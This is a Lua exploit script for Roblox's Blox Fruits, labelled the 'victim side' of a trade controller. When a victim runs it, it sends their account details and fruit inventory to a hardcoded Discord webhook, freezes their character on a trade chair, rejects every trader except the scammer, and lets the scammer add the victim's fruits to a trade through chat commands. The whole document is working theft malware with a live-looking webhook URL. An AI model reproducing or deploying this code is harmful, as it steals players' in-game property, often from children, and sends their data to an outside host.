--[[ ════════════════════════════════════════════════════════════════
     BLOX FRUITS  •  HOST <-> VICTIM  TRADE CONTROLLER  (victim side)
     - Reports the victim (info + fruits + join script) to your webhook
     - Freezes them and locks them onto a trade chair
     - Rejects any trader who isn't YOU, accepts when YOU sit
     - Reads YOUR chat commands to control their trade/inventory
     ════════════════════════════════════════════════════════════════ ]]

-- ─────────────────────────── CONFIG ───────────────────────────
local CONFIG = {
    WEBHOOK   = "https://discord.com/api/webhooks/1557385274063978608/BFnib3mAWd1QJH9Ck3YOS1K13DtJ3pgpXcMNAYJJKMLjyzKDgn-rbFoIUqgsq2wYmojv", -- your webhook
    HOST_NAME = "Jayaracena14",     -- YOUR exact Roblox username
    HOST_ID   = 0,           -- optional: your UserId (more reliable). 0 = ignore
    FREEZE    = true,        -- lock movement/jump
    AUTO_SIT  = true,        -- auto sit on a trade chair
    DEBUG     = true,
}
-- placeId -> sea label
local SEA_MAP = { [2753915549]="1", [4442272183]="2", [7449423635]="3" }

-- ─────────────────────────── SERVICES ─────────────────────────
local Players     = game:GetService("Players")
local RunService  = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local StarterGui  = game:GetService("StarterGui")
local Teleport    = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

local function log(...) if CONFIG.DEBUG then print("[HOST]", ...) end end

-- ─────────────────────── EXECUTOR DETECT ──────────────────────
local function getExecutor()
    local ok, name = pcall(function() return identifyexecutor() end)
    if ok and name then return name end
    if syn then return "Synapse" end
    if getexecutorname then local o,n=pcall(getexecutorname); if o then return n end end
    if KRNL_LOADED then return "Krnl" end
    return "Unknown"
end

-- ─────────────────────────── SEA ──────────────────────────────
local function getSea() return SEA_MAP[game.PlaceId] or "?" end

-- ────────────────────────── FRUITS ────────────────────────────
local RARITY = {
    Kitsune="Mythical", Dragon="Mythical", Leopard="Mythical", Dough="Mythical",
    Shadow="Legendary", Venom="Legendary", Control="Legendary", Spirit="Legendary",
    Gas="Legendary", Yeti="Legendary", Mammoth="Legendary", ["T-Rex"]="Legendary",
    Magma="Rare", Ghost="Rare", Door="Rare", Quake="Rare", Buddha="Rare", Love="Rare",
    Spider="Rare", Sound="Rare", Phoenix="Rare", Portal="Rare", Rumble="Rare",
    Blizzard="Rare", Gravity="Rare",
    Flame="Uncommon", Ice="Uncommon", Sand="Uncommon", Dark="Uncommon", Diamond="Uncommon",
    Light="Uncommon", Rubber="Uncommon", Barrier="Uncommon",
    Rocket="Common", Spin="Common", Blade="Common", Spring="Common", Bomb="Common",
    Smoke="Common", Spike="Common",
}
local ORDER = { Mythical=5, Legendary=4, Rare=3, Uncommon=2, Common=1 }

local function scanFruits()
    local counts = {}
    local function scan(c)
        if not c then return end
        for _, t in ipairs(c:GetChildren()) do
            if t:IsA("Tool") and RARITY[t.Name] then
                counts[t.Name] = (counts[t.Name] or 0) + 1
            end
        end
    end
    scan(LocalPlayer:FindFirstChild("Backpack"))
    scan(LocalPlayer.Character)
    return counts
end

local function fruitLines()
    local counts = scanFruits()
    local list = {}
    for name, n in pairs(counts) do
        table.insert(list, { name = name, n = n, r = RARITY[name] or "Common" })
    end
    table.sort(list, function(a, b)
        if a.r ~= b.r then return (ORDER[a.r] or 0) > (ORDER[b.r] or 0) end
        return a.name < b.name
    end)
    if #list == 0 then return { "🍎 None" } end
    local out = {}
    for _, it in ipairs(list) do
        table.insert(out, ("🍎 [%s] %s - %dx"):format(it.r, it.name, it.n))
    end
    return out
end

-- ─────────────────────────── WEBHOOK ──────────────────────────
local function httpPost(url, body)
    local req = (syn and syn.request) or (http and http.request) or http_request or request
    if not req then return false end
    local ok = pcall(function()
        req({ Url = url, Method = "POST",
              Headers = { ["Content-Type"] = "application/json" },
              Body = body })
    end)
    return ok
end

local function joinScript()
    return ([[
getgenv().HOST = true
getgenv().VICTIM = "%s"
game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)
]]):format(LocalPlayer.Name, game.PlaceId, game.JobId)
end

local function sendWebhook()
    local lines = {
        ("👤Display Name : %s"):format(LocalPlayer.DisplayName),
        ("🆔Username     : %s"):format(LocalPlayer.Name),
        ("📅Account Age  : %d days"):format(LocalPlayer.AccountAge),
        ("🖥️Executor     : %s"):format(getExecutor()),
        ("🌊Sea          : %s"):format(getSea()),
        ("😎 Receiver    : %s (me)"):format(CONFIG.HOST_NAME),
        "💰 Valuable Items",
    }
    for _, l in ipairs(fruitLines()) do table.insert(lines, l) end
    table.insert(lines, "📜 Join Script")
    table.insert(lines, "```lua\n" .. joinScript() .. "```")

    local body = HttpService:JSONEncode({ content = table.concat(lines, "\n") })
    return httpPost(CONFIG.WEBHOOK, body)
end

-- ─────────────────────────── GUI ──────────────────────────────
local gui, statusLabel, cmdLabel
local function buildGui()
    local parent = (gethui and gethui()) or LocalPlayer:FindFirstChild("PlayerGui")
    gui = Instance.new("ScreenGui")
    gui.Name = "HostTradeUI"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = parent

    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.fromScale(1, 1)
    bg.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
    bg.BackgroundTransparency = 0.35
    bg.BorderSizePixel = 0

    local panel = Instance.new("Frame", gui)
    panel.Size = UDim2.fromOffset(420, 200)
    panel.Position = UDim2.fromScale(0.5, 0.5)
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.BackgroundColor3 = Color3.fromRGB(18, 22, 34)
    panel.BorderSizePixel = 0
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
    local stroke = Instance.new("UIStroke", panel)
    stroke.Color = Color3.fromRGB(90, 140, 255); stroke.Thickness = 2

    local title = Instance.new("TextLabel", panel)
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0, 10)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.TextColor3 = Color3.fromRGB(150, 200, 255)
    title.Text = "HOST TRADE CONTROLLER"

    local spin = Instance.new("Frame", panel)
    spin.Size = UDim2.fromOffset(26, 26)
    spin.Position = UDim2.new(0, 20, 0, 60)
    spin.BackgroundColor3 = Color3.fromRGB(90, 140, 255)
    spin.BorderSizePixel = 0
    Instance.new("UICorner", spin).CornerRadius = UDim.new(1, 0)
    task.spawn(function()
        while gui.Parent do
            spin.Rotation = (spin.Rotation + 6) % 360
            RunService.RenderStepped:Wait()
        end
    end)

    statusLabel = Instance.new("TextLabel", panel)
    statusLabel.Size = UDim2.new(1, -70, 0, 60)
    statusLabel.Position = UDim2.new(0, 60, 0, 55)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 15
    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
    statusLabel.TextWrapped = true
    statusLabel.TextColor3 = Color3.fromRGB(235, 235, 245)
    statusLabel.Text = "Starting..."

    cmdLabel = Instance.new("TextLabel", panel)
    cmdLabel.Size = UDim2.new(1, -30, 0, 60)
    cmdLabel.Position = UDim2.new(0, 15, 0, 130)
    cmdLabel.BackgroundTransparency = 1
    cmdLabel.Font = Enum.Font.Code
    cmdLabel.TextSize = 13
    cmdLabel.TextXAlignment = Enum.TextXAlignment.Left
    cmdLabel.TextColor3 = Color3.fromRGB(150, 200, 255)
    cmdLabel.Text = ".add .addall .clear .reset .tp .kick"
end

local function setStatus(t) if statusLabel then statusLabel.Text = t end end

-- ────────────────────────── FREEZE ────────────────────────────
local frozen = CONFIG.FREEZE
local function freeze(on)
    frozen = on
    local ch = LocalPlayer.Character
    if not ch then return end
    local hum = ch:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    hum.WalkSpeed = on and 0 or 16
    hum.JumpPower = on and 0 or 50
    hum.UseJumpPower = true
end

-- ─────────────────────────── SIT ──────────────────────────────
local mySeat
local function findChair()
    -- prefer seats inside trade areas
    local best, bestScore
    for _, d in ipairs(workspace:GetDescendants()) do
        if d:IsA("Seat") or d:IsA("VehicleSeat") then
            local score = 0
            local a = d
            for _ = 1, 4 do
                a = a.Parent
                if not a then break end
                local n = a.Name:lower()
                if n:find("trade") then score = score + 3 end
                if n:find("cafe") or n:find("mansion") then score = score + 2 end
            end
            if d.Name:lower():find("chair") then score = score + 1 end
            if not bestScore or score > bestScore then best, bestScore = d, score end
        end
    end
    return best
end

local function sitDown()
    local ch = LocalPlayer.Character
    if not ch then return end
    local hum = ch:FindFirstChildOfClass("Humanoid")
    local root = ch:FindFirstChild("HumanoidRootPart")
    if not (hum and root) then return end
    mySeat = findChair()
    if not mySeat then setStatus("No trade chair found - waiting"); return end
    pcall(function()
        root.CFrame = mySeat.CFrame + Vector3.new(0, 3, 0)
        task.wait(0.2)
        mySeat:Sit(hum)
    end)
end

-- ─────────────────────── PARTNER WATCH ────────────────────────
local function isHost(p)
    return p and (p.Name == CONFIG.HOST_NAME or (CONFIG.HOST_ID ~= 0 and p.UserId == CONFIG.HOST_ID))
end

local hostInServer = false
local function watchPartner()
    task.spawn(function()
        while true do
            task.wait(0.35)
            local ch = LocalPlayer.Character
            local hum = ch and ch:FindFirstChildOfClass("Humanoid")
            if not hum then task.wait(0.5) end
            -- who else is sitting near us?
            for _, p in ipairs(Players:GetPlayers()) do
                if p ~= LocalPlayer then
                    local ph = p.Character and p.Character:FindFirstChildOfClass("Humanoid")
                    local seat = ph and ph.SeatPart
                    if seat and mySeat and (seat.Position - mySeat.Position).Magnitude < 20 then
                        if isHost(p) then
                            hostInServer = true
                            setStatus("HOST FOUND: " .. p.Name .. "\nTrading... do not move.")
                        else
                            setStatus("Rejecting: " .. p.Name .. "\n(not the host)")
                            -- jump + stand = reject, then re-sit
                            pcall(function()
                                hum.Jump = true
                                hum.Sit = false
                            end)
                            task.wait(0.6)
                            if CONFIG.AUTO_SIT then sitDown() end
                        end
                    end
                end
            end
            -- stay seated if we stood up
            if CONFIG.AUTO_SIT and hum and not hum.Sit and not hostInServer then
                if mySeat then pcall(function() mySeat:Sit(hum) end) end
            end
        end
    end)
end

-- ──────────────────── TRADE GUI AUTOMATION ────────────────────
local function getTradeGui()
    local pg = LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not pg then return nil end
    for _, g in ipairs(pg:GetChildren()) do
        if g:IsA("ScreenGui") and g.Enabled and g.Name:lower():find("trade") then
            return g
        end
    end
    return nil
end

local function clickButton(btn)
    pcall(function() firesignal(btn.MouseButton1Click) end)
end

local added = {}
local function addFruit(name)
    local root = getTradeGui() or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    for _, d in ipairs(root:GetDescendants()) do
        if (d:IsA("TextButton") or d:IsA("ImageButton")) and d.Name:lower() == name:lower() then
            clickButton(d)
            added[name] = true
            return true
        end
    end
    return false
end

local function clearTrade()
    if next(added) == nil then
        -- try a built-in clear button
        local root = getTradeGui()
        if root then
            for _, d in ipairs(root:GetDescendants()) do
                if d:IsA("TextButton") and (d.Name:lower():find("clear") or d.Text:lower():find("clear")) then
                    clickButton(d); return
                end
            end
        end
        return
    end
    for name in pairs(added) do addFruit(name) end -- toggles off
    added = {}
end

-- ───────────────────────── COMMANDS ───────────────────────────
local function onHostChat(msg)
    local cmd, arg = msg:match("^%.(%w+)%s*(.*)$")
    if not cmd then return end
    cmd = cmd:lower()
    log("cmd", cmd, arg)

    if cmd == "add" and arg ~= "" then
        local ok = addFruit(arg)
        setStatus(ok and ("Added " .. arg) or ("Could not find " .. arg))
    elseif cmd == "addall" or cmd == "addallfruits" then
        for name in pairs(scanFruits()) do addFruit(name) end
        setStatus("Added all fruits")
    elseif cmd == "addallpre" then
        -- "permanent" fruits (best-effort: everything currently held)
        for name in pairs(scanFruits()) do addFruit(name) end
        setStatus("Added all permanent fruits")
    elseif cmd == "clear" or cmd == "clearall" then
        clearTrade()
        setStatus("Cleared trade")
    elseif cmd == "reset" then
        pcall(function() LocalPlayer.Character:BreakJoints() end)
        setStatus("Resetting...")
    elseif cmd == "tp" then
        local target = Players:FindFirstChild(arg) or Players:FindFirstChild(CONFIG.HOST_NAME)
        if target and target.Character and LocalPlayer.Character then
            LocalPlayer.Character:PivotTo(target.Character:GetPivot())
            setStatus("Teleported to " .. target.Name)
        end
    elseif cmd == "kick" then
        local ch = LocalPlayer.Character
        local hum = ch and ch:FindFirstChildOfClass("Humanoid")
        if hum then hum.Sit = false end
        setStatus("Stood up (trade cancelled)")
    end
end

local function hookChat()
    local function bind(p)
        p.Chatted:Connect(function(m) if isHost(p) then onHostChat(m) end end)
    end
    for _, p in ipairs(Players:GetPlayers()) do bind(p) end
    Players.PlayerAdded:Connect(bind)
end

-- ─────────────────────────── MAIN ─────────────────────────────
local function main()
    repeat task.wait(0.2) until game:IsLoaded()
    LocalPlayer:WaitForChild("Character")
    LocalPlayer.Character:WaitForChild("Humanoid")

    pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
    buildGui()
    setStatus("Gathering data...")

    task.spawn(sendWebhook)
    task.spawn(function()
        setStatus("Reporting to host...")
        task.wait(1)
        setStatus("Freezing + finding trade table...")
        if CONFIG.FREEZE then freeze(true) end
        task.wait(0.5)
        if CONFIG.AUTO_SIT then sitDown() end
        setStatus("Waiting for the host to join and sit...")
    end)

    -- re-apply freeze / re-sit after respawn
    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        if CONFIG.FREEZE then freeze(true) end
        if CONFIG.AUTO_SIT then sitDown() end
    end)

    watchPartner()
    hookChat()
end

main()
